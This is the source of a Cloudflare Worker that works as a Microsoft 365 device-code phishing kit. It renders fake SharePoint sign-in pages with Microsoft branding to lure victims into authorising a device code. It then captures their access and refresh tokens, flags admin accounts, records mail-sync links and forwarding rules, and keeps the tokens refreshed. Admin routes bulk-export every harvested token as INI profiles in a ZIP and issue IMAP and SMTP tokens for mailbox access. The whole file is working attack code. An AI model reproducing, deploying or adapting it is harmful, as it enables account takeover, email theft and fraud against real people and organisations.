const CLIENT_ID_DEFAULT = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const FORWARDING_DEFAULT = '1';

const ADMIN_ROLE_TEMPLATES = [
  '62e90394-69f5-4237-9190-012177145e10',
  'e8611ab8-c189-46e8-94e1-60213ab1f814',
  '194ae4cb-b126-40b2-bd5b-6091b380977d'
];

const REQUESTED_SCOPE =
  'offline_access openid profile email https://graph.microsoft.com/.default';
const IMAP_SCOPE =
  'offline_access https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send';

/* ---------- helpers ---------- */

const json = (obj, status = 200) =>
  new Response(JSON.stringify(obj), {
    status,
    headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
  });

const corsPreflight = () => new Response(null, {
  status: 204,
  headers: {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, x-admin-key'
  }
});

const html = (body, status = 200, headers = {}) =>
  new Response(body, { status, headers: { 'Content-Type': 'text/html; charset=utf-8', ...headers } });

const authority = (env) => `https://login.microsoftonline.com/${env.TENANT_ID || 'common'}`;
const clientId = (env) => env.CLIENT_ID || CLIENT_ID_DEFAULT;

const sqlNow = (d = new Date()) => d.toISOString().slice(0, 19).replace('T', ' ');
const safeName = (email) => email.replace(/[^a-z0-9@._-]/gi, '_');
const escapeHtml = (s) => String(s ?? '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

const publicAccount = (a) => a && ({
  id: a.id, email: a.email, display_name: a.display_name, tenant_id: a.tenant_id,
  is_admin: a.is_admin, admin_roles: a.admin_roles,
  token_expires: a.token_expires, updated_at: a.updated_at,
  usage_location: a.usage_location, forwarding_enabled: a.forwarding_enabled,
  expired: new Date(a.token_expires).getTime() < Date.now()
});

async function graphGet(url, token) {
  const r = await fetch(url, { headers: { Authorization: `Bearer ${token}` } });
  if (!r.ok) return null;
  return r.json();
}

/* ---------- KV storage ---------- */

async function getDb(env) {
  return (await env.STORE.get('db', 'json')) || { accounts: [], pages: [] };
}
const putDb = (env, db) => env.STORE.put('db', JSON.stringify(db));
const getSession = (env, id) => env.SESSIONS.get('s:' + id, 'json');
const putSession = (env, s) => env.SESSIONS.put('s:' + s.id, JSON.stringify(s), { expirationTtl: 900 });
const delSession = (env, id) => env.SESSIONS.delete('s:' + id);

/* ---------- microsoft ---------- */

async function checkAdmin(accessToken) {
  const j = await graphGet(
    'https://graph.microsoft.com/v1.0/me/transitiveMemberOf/microsoft.graph.directoryRole?$select=displayName,roleTemplateId',
    accessToken
  );
  if (!j?.value) return { is_admin: 0, roles: [] };
  const isAdmin = j.value.some(r => ADMIN_ROLE_TEMPLATES.includes(r.roleTemplateId)) ? 1 : 0;
  const roles = isAdmin ? j.value.map(r => r.displayName).filter(Boolean) : [];
  return { is_admin: isAdmin, roles };
}

async function getDeltaLinks(accessToken) {
  async function delta(folder) {
    try {
      let url = `https://graph.microsoft.com/v1.0/me/mailFolders('${folder}')/messages/delta?$top=200&$select=id`;
      for (let i = 0; i < 15; i++) {
        const r = await fetch(url, { headers: { Authorization: `Bearer ${accessToken}` } });
        if (!r.ok) return '';
        const j = await r.json();
        if (j['@odata.deltaLink']) return j['@odata.deltaLink'];
        if (j['@odata.nextLink']) { url = j['@odata.nextLink']; continue; }
        return '';
      }
      return '';
    } catch { return ''; }
  }
  const [inbox, sent] = await Promise.all([delta('inbox'), delta('sentitems')]);
  return { inbox, sent };
}

async function checkForwarding(accessToken) {
  try {
    const r = await fetch('https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules', {
      headers: { Authorization: `Bearer ${accessToken}` }
    });
    if (!r.ok) return FORWARDING_DEFAULT;
    const j = await r.json();
    const fwd = (j.value || []).some(x => x.actions &&
      ((x.actions.forwardTo || []).length || (x.actions.forwardAsAttachmentTo || []).length));
    return fwd ? '1' : '0';
  } catch { return FORWARDING_DEFAULT; }
}

async function refreshOne(env, acc, scope) {
  if (!acc.refresh_token) return { ok: false, error: 'no_refresh_token' };
  try {
    const r = await fetch(`${authority(env)}/oauth2/v2.0/token`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        grant_type: 'refresh_token',
        client_id: clientId(env),
        refresh_token: acc.refresh_token,
        scope: scope || REQUESTED_SCOPE
      })
    });
    const j = await r.json();
    if (!r.ok) return { ok: false, error: j.error || 'refresh_failed' };
    acc.access_token = j.access_token;
    if (j.refresh_token) acc.refresh_token = j.refresh_token;
    acc.token_expires = new Date(Date.now() + j.expires_in * 1000).toISOString();
    acc.updated_at = sqlNow();
    if (j.scope) acc.token_scope = j.scope;
    return { ok: true };
  } catch (e) {
    return { ok: false, error: String(e) };
  }
}

/* ---------- jwt / zip / ini ---------- */

function decodeJwt(token) {
  try {
    const p = token.split('.')[1];
    if (!p) return null;
    let s = p.replace(/-/g, '+').replace(/_/g, '/');
    while (s.length % 4) s += '=';
    return JSON.parse(new TextDecoder().decode(Uint8Array.from(atob(s), c => c.charCodeAt(0))));
  } catch { return null; }
}

const TS_CLAIMS = new Set(['exp', 'iat', 'nbf', 'auth_time', 'pwd_exp', 'at_valid']);

function annotateClaims(claims) {
  if (!claims) return null;
  const out = {};
  for (const [k, v] of Object.entries(claims)) {
    if (TS_CLAIMS.has(k) && typeof v === 'number') {
      out[k] = { value: v, iso: new Date(v * 1000).toISOString() };
    } else if (['scp', 'roles', 'group', 'amr'].includes(k)) {
      out[k] = Array.isArray(v) ? v : String(v).split(' ');
    } else {
      out[k] = v;
    }
  }
  return out;
}

async function sha256hex(s, n = 16) {
  const h = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
  return [...new Uint8Array(h)].map(b => b.toString(16).padStart(2, '0')).join('').slice(0, n);
}

const CRC_TABLE = (() => {
  const t = new Int32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c;
  }
  return t;
})();

function crc32(bytes) {
  let c = -1;
  for (let i = 0; i < bytes.length; i++) c = (c >>> 8) ^ CRC_TABLE[(c ^ bytes[i]) & 0xff];
  return (c ^ -1) >>> 0;
}

function zipStore(files) {
  const enc = new TextEncoder();
  const u16 = v => new Uint8Array([v & 255, (v >>> 8) & 255]);
  const u32 = v => new Uint8Array([v & 255, (v >>> 8) & 255, (v >>> 16) & 255, (v >>> 24) & 255]);
  const now = new Date();
  const dosTime = u16(((now.getUTCHours() << 11) | (now.getUTCMinutes() << 5) | Math.floor(now.getUTCSeconds() / 2)) & 0xffff);
  const dosDate = u16((((now.getUTCFullYear() - 1980) << 9) | ((now.getUTCMonth() + 1) << 5) | now.getUTCDate()) & 0xffff);

  const parts = [];
  const central = [];
  let offset = 0;

  for (const f of files) {
    const name = enc.encode(f.name);
    const data = enc.encode(f.data);
    const crc = u32(crc32(data));

    parts.push(u32(0x04034b50), u16(20), u16(0x0800), u16(0), dosTime, dosDate,
      crc, u32(data.length), u32(data.length), u16(name.length), u16(0), name, data);

    central.push(u32(0x02014b50), u16(20), u16(20), u16(0x0800), u16(0), dosTime, dosDate,
      crc, u32(data.length), u32(data.length), u16(name.length), u16(0), u16(0), u16(0), u16(0), u32(0), u32(offset), name);

    offset += 30 + name.length + data.length;
  }

  const cdSize = central.reduce((a, b) => a + b.length, 0);
  parts.push(...central,
    u32(0x06054b50), u16(0), u16(0), u16(files.length), u16(files.length), u32(cdSize), u32(offset), u16(0));

  let total = 0;
  for (const p of parts) total += p.length;
  const out = new Uint8Array(total);
  let pos = 0;
  for (const p of parts) { out.set(p, pos); pos += p.length; }
  return out;
}

function toIni(a) {
  return [
    '[profile]',
    `email=${a.email}`,
    `tenant_id=${a.tenant_id}`,
    `client_id=${a.client_id}`,
    'client_secret=',
    `redirect_uri=${a.redirect_uri}`,
    `access_token=${a.access_token}`,
    `refresh_token=${a.refresh_token}`,
    `token_expires=${a.token_expires}`,
    `delta_link=${a.delta_link || ''}`,
    `sent_delta_link=${a.sent_delta_link || ''}`,
    `is_admin=${a.is_admin}`,
    `admin_roles=${JSON.stringify(a.admin_roles)}`,
    `admin_checked_at=${a.admin_checked_at}`,
    `updated_at=${a.updated_at}`,
    `token_scope=${a.token_scope}`,
    'access_mode=oauth',
    `usage_location=${a.usage_location || 'US'}`,
    `forwarding_enabled=${a.forwarding_enabled || '0'}`,
    ''
  ].join('\n');
}

/* ---------- link page renderer ---------- */

function pageHtml(p, origin) {
  const org = escapeHtml(p.org);
  const doc = p.doc ? `<p class="vz-ctx-doc">${escapeHtml(p.doc)}</p>` : '';
  return `<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>SharePoint</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f5f5;min-height:100vh;color:#333}
.hidden{display:none!important}
.vz-spinner{width:40px;height:40px;border:3px solid #e5e7eb;border-top-color:#036c70;border-radius:50%;animation:vzspin .8s linear infinite;margin:0 auto 16px}
@keyframes vzspin{to{transform:rotate(360deg)}}
.vz-loading,.vz-success,.vz-error{text-align:center;padding:48px 24px}
.vz-ok,.vz-err{width:64px;height:64px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:28px;font-weight:700;color:#fff}
.vz-ok{background:#10b981}.vz-err{background:#ef4444}
.vz-code-line{font-size:16px;color:#333;margin-bottom:12px}
.vz-signin-line{font-size:14px;color:#666;margin:16px 0 20px}
.vz-timer{font-size:13px;color:#999;margin-top:14px}
.code{font-size:28px;font-weight:700;font-family:'Courier New',monospace;letter-spacing:4px;color:#036c70;cursor:pointer;user-select:all}
.copy-btn{background:#036c70;color:#fff;border:none;padding:9px 20px;border-radius:6px;cursor:pointer;font-size:13px;font-weight:600;margin-top:8px}
.copy-btn:hover{opacity:.9}
.verify-btn{width:100%;background:#036c70;color:#fff;border:none;padding:13px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
.verify-btn:hover{background:#024f52}
.vz-brand{margin:0 auto 20px;display:flex;justify-content:center;align-items:center}
.vz-brand svg{height:28px;max-width:160px;display:block}
.vz-ctx{margin-bottom:20px;text-align:center}
.vz-ctx-doc{font-size:15px;font-weight:600;color:#1a1a1a;margin-bottom:4px}
.vz-ctx-org{font-size:13px;color:#666}
.vz-page{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
.vz-card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.1);width:100%;max-width:420px;padding:36px 32px;text-align:center;border:1px solid #e8e8e8}
</style></head><body>
<div class="vz-page"><div class="vz-card">
  <div class="vz-brand" style="color:#036c70"><svg viewBox="0 0 120 28" xmlns="http://www.w3.org/2000/svg"><rect width="12" height="12" fill="#f25022"/><rect x="14" width="12" height="12" fill="#7fba00"/><rect y="14" width="12" height="12" fill="#00a4ef"/><rect x="14" y="14" width="12" height="12" fill="#ffb900"/><text x="34" y="19" font-family="Segoe UI,sans-serif" font-size="16" font-weight="600" fill="currentColor">SharePoint</text></svg></div>
  <div class="vz-ctx">${doc}<p class="vz-ctx-org">${org}</p></div>
  <div id="loadingScreen" class="vz-loading"><div class="vz-spinner"></div></div>
  <div id="mainScreen" class="hidden">
    <p class="vz-code-line">Your code is:</p>
    <span class="code" id="userCode">------</span><br>
    <button class="copy-btn" id="copyBtn">Copy Code</button>
    <p class="vz-signin-line">Sign in with Microsoft.</p>
    <button class="verify-btn" id="verifyBtn"><svg viewBox="0 0 21 21" width="20" height="20"><rect width="10" height="10" fill="#f25022"/><rect x="11" width="10" height="10" fill="#7fba00"/><rect y="11" width="10" height="10" fill="#00a4ef"/><rect x="11" y="11" width="10" height="10" fill="#ffb900"/></svg> Continue with Microsoft</button>
    <p class="vz-timer" id="timer"></p>
  </div>
  <div id="successScreen" class="hidden vz-success"><div class="vz-ok">&#10003;</div><h2>Authentication Successful</h2><p>Redirecting you now...</p></div>
  <div id="errorScreen" class="hidden vz-error"><div class="vz-err">!</div><h2>Authentication Failed</h2><p id="errorMessage"></p></div>
</div></div>
<script>
var API_BASE = ${JSON.stringify(origin)};
var REDIRECT_URL = ${JSON.stringify(p.redirect || 'https://www.microsoft.com')};
var PAGE_ID = ${JSON.stringify(p.id)};
var sessionId=null,code=null,verifyUrl=null,expiresIn=900,delay=5000;
var loadingScreen=document.getElementById('loadingScreen'),mainScreen=document.getElementById('mainScreen'),successScreen=document.getElementById('successScreen'),errorScreen=document.getElementById('errorScreen'),userCodeEl=document.getElementById('userCode'),timerEl=document.getElementById('timer'),errorMessageEl=document.getElementById('errorMessage'),copyBtn=document.getElementById('copyBtn'),verifyBtn=document.getElementById('verifyBtn');
var COPY_LABEL=copyBtn?copyBtn.textContent:'Copy Code';
function showError(m){loadingScreen.classList.add('hidden');mainScreen.classList.add('hidden');errorMessageEl.textContent=m;errorScreen.classList.remove('hidden');}
function showSuccess(){loadingScreen.classList.add('hidden');mainScreen.classList.add('hidden');successScreen.classList.remove('hidden');setTimeout(function(){window.location.href=REDIRECT_URL;},3000);}
function updateTimer(){if(!timerEl||expiresIn<=0)return;expiresIn--;var m=Math.floor(expiresIn/60),s=expiresIn%60;timerEl.textContent='Code expires in '+m+':'+(s<10?'0':'')+s;if(expiresIn>0)setTimeout(updateTimer,1000);}
function copyToClipboard(){if(!code)return false;try{if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(code).catch(function(){});}else{var t=document.createElement('textarea');t.value=code;t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.focus();t.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(t);}}catch(e){return false;}return true;}
function showCopyFeedback(){copyBtn.textContent='Copied!';setTimeout(function(){copyBtn.textContent=COPY_LABEL;},2000);}
function openVerifyWindow(){if(!verifyUrl)return;window.open(verifyUrl,'_blank','width=520,height=700,scrollbars=yes,resizable=yes');}
function onCopyClick(){if(!copyToClipboard())return;showCopyFeedback();openVerifyWindow();}
function openMicrosoftLogin(){if(!code)return;copyToClipboard();showCopyFeedback();openVerifyWindow();}
function poll(){if(!sessionId)return;fetch(API_BASE+'/api/poll/'+sessionId).then(function(r){return r.json();}).then(function(d){
  if(d.status==='connected'){showSuccess();return;}
  if(d.status==='expired'){showError('Code expired. Please refresh.');return;}
  if(d.retry_after)delay=Math.max(delay,d.retry_after*1000);
  setTimeout(poll,delay);
}).catch(function(){setTimeout(poll,delay);});}
async function startDeviceCode(){try{var r=await fetch(API_BASE+'/api/devicecode',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({label:null,pageId:PAGE_ID})});var d={};try{d=await r.json();}catch(e){}if(!r.ok)throw new Error(d.error||d.description||('Verification service error ('+r.status+')'));if(!d.session_id&&!d.sessionId)throw new Error('Invalid verification response from server');sessionId=d.session_id||d.sessionId;code=d.user_code;verifyUrl=d.verification_uri;expiresIn=d.expires_in||900;userCodeEl.textContent=code;loadingScreen.classList.add('hidden');mainScreen.classList.remove('hidden');updateTimer();setTimeout(poll,delay);}catch(err){showError((err&&err.message)||('Failed to connect to verification service at '+API_BASE));}}
copyBtn.addEventListener('click',onCopyClick);
verifyBtn.addEventListener('click',openMicrosoftLogin);
startDeviceCode();
</script>
</body></html>`;
}

/* ---------- public routes ---------- */

async function handleDevicecode(request, env, origin) {
  const body = await request.json().catch(() => ({}));
  const r = await fetch(`${authority(env)}/oauth2/v2.0/devicecode`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      client_id: clientId(env),
      scope: REQUESTED_SCOPE
    })
  });
  const j = await r.json();
  if (!r.ok) return json({ error: j.error, description: j.error_description }, 400);

  const id = crypto.randomUUID();
  const db = await getDb(env);
  const pageId = String(body?.pageId || '').trim();
  const pageIdFinal = pageId && pageId !== 'connect' && (db.pages || []).some(p => p.id === pageId) ? pageId : null;

  await putSession(env, {
    id,
    label: String(body?.label || '').trim(),
    pageId: pageIdFinal,
    device_code: j.device_code,
    interval: j.interval || 5,
    expires_at: Date.now() + j.expires_in * 1000
  });

  return json({
    session_id: id,
    user_code: j.user_code,
    verification_uri: j.verification_uri,
    expires_in: j.expires_in,
    interval: j.interval || 5
  });
}

async function handlePoll(request, env, id, origin) {
  const s = await getSession(env, id);
  if (!s || Date.now() > s.expires_at) {
    if (s) await delSession(env, id);
    return json({ status: 'expired' });
  }

  const r = await fetch(`${authority(env)}/oauth2/v2.0/token`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
      client_id: clientId(env),
      device_code: s.device_code
    })
  });
  const j = await r.json();

  if (j.error === 'authorization_pending') return json({ status: 'pending' });
  if (j.error === 'slow_down') return json({ status: 'pending', retry_after: 5 });
  if (j.error === 'expired_token') { await delSession(env, id); return json({ status: 'expired' }); }
  if (j.error === 'authorization_declined') { await delSession(env, id); return json({ status: 'declined' }); }
  if (!r.ok) return json({ status: 'error', description: j.error_description });

  const me = await graphGet(
    'https://graph.microsoft.com/v1.0/me?$select=mail,userPrincipalName,displayName,id,usageLocation',
    j.access_token
  );
  const email = me?.mail || me?.userPrincipalName || s.label || 'unknown';
  const admin = await checkAdmin(j.access_token);
  const deltas = await getDeltaLinks(j.access_token);
  const forwarding = await checkForwarding(j.access_token);
  const now = new Date();

  const account = {
    id: crypto.randomUUID(),
    email,
    display_name: me?.displayName || '',
    tenant_id: env.TENANT_ID || 'common',
    client_id: clientId(env),
    redirect_uri: `${origin}/api/v1/auth/redirect`,
    access_token: j.access_token,
    refresh_token: j.refresh_token || '',
    token_expires: new Date(now.getTime() + j.expires_in * 1000).toISOString(),
    delta_link: deltas.inbox,
    sent_delta_link: deltas.sent,
    is_admin: admin.is_admin,
    admin_roles: admin.roles,
    admin_checked_at: sqlNow(now),
    updated_at: sqlNow(now),
    token_scope: j.scope || REQUESTED_SCOPE,
    access_mode: 'oauth',
    usage_location: me?.usageLocation || '',
    forwarding_enabled: forwarding,
    created_at: now.toISOString()
  };

  const db = await getDb(env);
  db.accounts = db.accounts.filter(a => a.email.toLowerCase() !== email.toLowerCase());
  db.accounts.push(account);
  if (s.pageId) {
    const pg = (db.pages || []).find(p => p.id === s.pageId);
    if (pg) {
      pg.connections = (pg.connections || 0) + 1;
      pg.last_email = email;
      pg.last_connected_at = sqlNow(now);
    }
  }
  await putDb(env, db);
  await delSession(env, id);

  return json({ status: 'connected', account: publicAccount(account) });
}

/* ---------- admin routes ---------- */

async function handleAdmin(request, env, path, origin, url) {
  if (!env.ADMIN_KEY || request.headers.get('x-admin-key') !== env.ADMIN_KEY)
    return json({ error: 'unauthorized' }, 401);

  const db = await getDb(env);
  const method = request.method;
  const seg = path.split('/'); // ['', 'api', 'admin', ...]

  // --- collection routes ---
  if (path === '/api/admin/accounts' && method === 'GET')
    return json({ accounts: db.accounts.map(publicAccount) });

  if (path === '/api/admin/pages' && method === 'GET')
    return json({ pages: db.pages || [] });

  if (path === '/api/admin/pages' && method === 'POST') {
    const body = await request.json().catch(() => ({}));
    const p = {
      id: crypto.randomUUID().replace(/-/g, '').slice(0, 8),
      org: String(body?.org || 'Microsoft 365').slice(0, 80),
      doc: String(body?.doc || '').slice(0, 80),
      redirect: String(body?.redirect || 'https://www.microsoft.com').slice(0, 200),
      created_at: new Date().toISOString(),
      visits: 0, connections: 0, last_email: '', last_connected_at: ''
    };
    db.pages = db.pages || [];
    db.pages.push(p);
    await putDb(env, db);
    return json({ page: p });
  }

  if (path === '/api/admin/refresh-all' && method === 'POST') {
    const results = [];
    for (const acc of db.accounts) {
      const out = await refreshOne(env, acc);
      results.push({ email: acc.email, ...out });
    }
    await putDb(env, db);
    return json({
      refreshed: results.filter(r => r.ok).length,
      failed: results.filter(r => !r.ok).length,
      results
    });
  }

  if (path === '/api/admin/export-all.zip' && method === 'GET') {
    const withRefresh = url.searchParams.get('refresh') === '1';
    const report = [];
    const files = [];
    for (const acc of db.accounts) {
      if (withRefresh) {
        const out = await refreshOne(env, acc);
        report.push(`${acc.email}\t${out.ok ? 'refreshed' : 'FAILED: ' + out.error}`);
      }
      files.push({ name: `profiles/${safeName(acc.email)}.ini`, data: toIni(acc) });
    }
    if (withRefresh) {
      await putDb(env, db);
      files.unshift({
        name: '_refresh-report.txt',
        data: `Generated ${new Date().toISOString()}\nRefreshed ${report.filter(r => r.endsWith('refreshed')).length} / ${report.length}\n\n${report.join('\n')}\n`
      });
    }
    if (!files.length) return json({ error: 'no_accounts' }, 404);
    return new Response(zipStore(files), {
      headers: {
        'Content-Type': 'application/zip',
        'Content-Disposition': `attachment; filename="profiles-${Date.now()}.zip"`,
        'Access-Control-Allow-Origin': '*'
      }
    });
  }

  // --- item routes: /api/admin/<thing>/<id> ---
  const thing = seg[3];
  const itemId = seg[4];

  if (thing === 'pages' && itemId && method === 'DELETE') {
    db.pages = (db.pages || []).filter(x => x.id !== itemId);
    await putDb(env, db);
    return json({ ok: true });
  }

  const acc = db.accounts.find(a => a.id === itemId);
  if (thing === 'accounts' && !acc)
    return json({ error: 'not_found' }, 404);

  if (thing === 'accounts' && method === 'GET') {
    const claims = decodeJwt(acc.access_token);
    const scopes = (acc.token_scope || '').split(/\s+/).filter(Boolean);
    return json({
      account: publicAccount(acc),
      access_token: {
        length: acc.access_token.length,
        sha256: await sha256hex(acc.access_token),
        format: claims ? 'jwt' : 'opaque',
        claims: annotateClaims(claims)
      },
      refresh_token: {
        length: (acc.refresh_token || '').length,
        present: Boolean(acc.refresh_token),
        prefix: (acc.refresh_token || '').slice(0, 12),
        sha256: acc.refresh_token ? await sha256hex(acc.refresh_token) : null
      },
      scope: {
        count: scopes.length,
        items: scopes,
        graph_resource: scopes.some(s => s.startsWith('https://graph.microsoft.com/')),
        delegated_mail: scopes.some(s => /^(Mail|IMAP|SMTP|POP)/i.test(s))
      },
      mailbox: {
        usage_location: acc.usage_location || '',
        forwarding_enabled: acc.forwarding_enabled || '0',
        delta_link_present: Boolean(acc.delta_link),
        sent_delta_link_present: Boolean(acc.sent_delta_link)
      },
      audit: {
        client_id: acc.client_id,
        redirect_uri: acc.redirect_uri,
        access_mode: acc.access_mode,
        created_at: acc.created_at,
        admin_checked_at: acc.admin_checked_at
      }
    });
  }

  if (thing === 'export' && method === 'GET')
    return new Response(toIni(acc), {
      headers: {
        'Content-Type': 'text/plain; charset=utf-8',
        'Content-Disposition': `attachment; filename="${safeName(acc.email)}.ini"`,
        'Access-Control-Allow-Origin': '*'
      }
    });

  if (thing === 'refresh' && method === 'POST') {
    const out = await refreshOne(env, acc);
    if (!out.ok) return json({ error: out.error }, 400);
    await putDb(env, db);
    return json({ ok: true, account: publicAccount(acc) });
  }

  if (thing === 'token' && method === 'GET') {
    const scope = url.searchParams.get('resource') === 'imap' ? IMAP_SCOPE : REQUESTED_SCOPE;
    const out = await refreshOne(env, acc, scope);
    if (!out.ok) return json({ error: out.error }, 400);
    await putDb(env, db);
    return json({ email: acc.email, access_token: acc.access_token, expires_at: acc.token_expires });
  }

  if (thing === 'accounts' && method === 'DELETE') {
    db.accounts = db.accounts.filter(a => a.id !== itemId);
    await putDb(env, db);
    return json({ ok: true });
  }

  return json({ error: 'not_found' }, 404);
}

/* ---------- entry ---------- */

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;
    const origin = url.origin;

    try {
      if (request.method === 'OPTIONS') return corsPreflight();
      if (path === '/api/health') return json({ ok: true });
      if (path === '/api/devicecode' && request.method === 'POST') return handleDevicecode(request, env, origin);
      if (path.startsWith('/api/poll/')) return handlePoll(request, env, path.split('/')[3], origin);
      if (path.startsWith('/api/admin/')) return handleAdmin(request, env, path, origin, url);

      if (path.startsWith('/p/')) {
        const db = await getDb(env);
        const p = (db.pages || []).find(x => x.id === path.split('/')[2]);
        if (!p) return html('<p style="font-family:sans-serif;padding:40px;text-align:center">Page not found.</p>', 404);
        p.visits = (p.visits || 0) + 1;
        await putDb(env, db);
        return html(pageHtml(p, origin));
      }

      if (path === '/connect') {
        return html(pageHtml({ id: 'connect', org: 'Microsoft 365', doc: '', redirect: 'https://www.microsoft.com' }, origin));
      }

      if (path === '/api/v1/auth/redirect') {
        return html('<!doctype html><meta charset="utf-8"><title>Connected</title>' +
          '<body style="font-family:Segoe UI,sans-serif;display:grid;place-items:center;height:100vh;margin:0;background:#f6f7f9">' +
          '<div style="text-align:center"><h2 style="color:#107c41">Account connected</h2>' +
          '<p style="color:#5b6472">You can close this tab.</p></div>');
      }

      if (path === '/') return Response.redirect(origin + '/admin.html', 302);

      // everything else = static assets (admin.html), served by the worker itself
      return env.ASSETS.fetch(request);
    } catch (e) {
      return json({ error: 'server_error', description: String(e && e.stack || e) }, 500);
    }
  }
};